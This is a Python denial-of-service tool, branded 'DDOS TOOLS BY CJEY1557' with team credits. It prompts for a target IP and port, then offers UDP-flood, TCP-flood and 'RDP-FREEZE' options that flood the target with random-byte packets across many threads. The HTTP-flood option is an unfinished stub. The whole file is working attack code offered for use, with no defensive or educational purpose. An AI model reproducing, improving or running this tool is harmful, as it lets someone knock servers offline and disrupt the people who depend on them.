import random
import socket
import threading
import os
import time
import sys
import struct
import codecs

Data = [
 codecs.decode('53414d5090d91d4d611e700a465b00', 'hex_codec'),
 codecs.decode('53414d509538e1a9611e63', 'hex_codec'),
 codecs.decode('53414d509538e1a9611e69', 'hex_codec'),
 codecs.decode('53414d509538e1a9611e72', 'hex_codec'),
 codecs.decode('081e62da', 'hex_codec'),
 codecs.decode('081e77da', 'hex_codec'),
 codecs.decode('081e4dda', 'hex_codec'),
 codecs.decode('021efd40', 'hex_codec'),
 codecs.decode('081e7eda', 'hex_codec')]

clear = lambda: os.system("cls")
clear()
print("""
\u001b[31m
  \u001b[31m> \u001b[33mDDOS TOOLS BY : \u001b[31mCJEY1557
  \u001b[31m> \u001b[33mCoded : \u001b[31mHAZIQ|CJEY1557
  \u001b[31m> \u001b[33mTeam : \u001b[37mBL4CKSU1TS
  \u001b[31m> \u001b[33mCan Down Normal Server In A Sec By : \u001b[31mHaziq
  \u001b[31m> \u001b[33mVIP TOOLS FOR : \u001b[31mCJEY
""")

ip = str(input("   \u001b[31m[X] \u001b[37m@DDOS ════> Ip/Host :\u001b[31m  "))
port = int(input("   \u001b[31m[Y] \u001b[37m@DDOS ════> Port Server :\u001b[31m  "))
clear()

print("""
                                             \u001b[37;1m╔╦╗  ╔═╗  ╔╦╗  ╦ ╦  ╔═╗  ╔╦╗
                                             \u001b[37;1m║║║  ║╣    ║   ╠═╣  ║ ║   ║║
                                             \u001b[37;1m╩ ╩  ╚═╝   ╩   ╩ ╩  ╚═╝  ═╩╝
                      \u001b[36;1m╔═══════════════════════════════════════════════════════════════════════════╗
                      ║  - - - - - - - - - Version: \u001b[37;1m1.00 Last Update 9/26/2021\u001b[36;1m - - - - - - - - -  ║
                      ║  - - - - - - - - - Discord: \u001b[37;1mCJEY\u001b[36;1m                       - - - - - - - - -  ║
                 ╔════╩═══════════════════════════════════════════════════════════════════════════╩════╗
                 ╚════╦═══════════════════════════════════════════════════════════════════════════╦════╝
               \u001b[36;1m╔══════╩══════════════╦═════════════════════╦═══════════════════════╦══════════════╩═════╗
               \u001b[36;1m║ [1] \u001b[37;1mUDP-FLOOD\u001b[36;1m       ║ [2] \u001b[37;1mTCP-FLOOD\u001b[36;1m       ║ [3] \u001b[37;1mRDP-FREEZE\u001b[36;1m        ║ [4] \u001b[37;1mHTTP-FLOOD\u001b[36;1m     ║
               ╚═════════════════════╩═════════════════════╩═══════════════════════╩════════════════════╝
""")
choice = str(input("   \u001b[31m[B] \u001b[37m@DDOS ════> Choice :\u001b[31m  "))
times = int(input("   \u001b[31m[S] \u001b[37m@DDOS ════> Connections :\u001b[31m  "))
threads = int(input("   \u001b[31m[B] \u001b[37m@DDOS ════> Threading :\u001b[31m  "))

def run1():
    bytes = random._urandom(1032)
    byte = random._urandom(1123)
    byt = random._urandom(1124)
    by = random._urandom(1024)
    b = random._urandom(1125)
    a = random._urandom(1180)
    c = random._urandom(1024)
    d = random._urandom(1800)
    i = random.choice(("[€]","[¥]","[✓]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(bytes,addr)
                s.sendto(byte,addr)
                s.sendto(byt,addr)
                s.sendto(by,addr)
                s.sendto(b,addr)
                s.sendto(a,addr)
                s.sendto(c,addr)
                s.sendto(d,addr)
            print(i,f"\u001b[33m [¥] @ATTACK ════> \u001b[31mTo Ip \u001b[37m{ip} \u001b[31mOn Port \u001b[37m{port}")
        except:
            print(i,f"\u001b[33m [¥] @ATTACK ════> \u001b[31mTo Ip \u001b[37m{ip} \u001b[31mOn Port \u001b[37m{port}")

def run2():
    data = random._urandom(1032)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
        except:
            s.close()

def run3():
    data = random._urandom(9024)
    i = random.choice(("[*]","[!]","[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Sedang Menyerang")
        except socket.error:
            s.close()
            print("[*] Sedang Menyerang")

def run4():
    i = random.choice(("[*]","[!]","[#]"))
    print(i +"BELUM SIAP")

for y in range(threads):
    if choice == '1':
        th = threading.Thread(target = run1)
        th.start()
    elif choice == '2':
         th = threading.Thread(target = run2)
         th.start()
    elif choice == '3':
         th = threading.Thread(target = run3)
         th.start()
    elif choice == '4':
         th = threading.Thread(target = run4)
         th.start()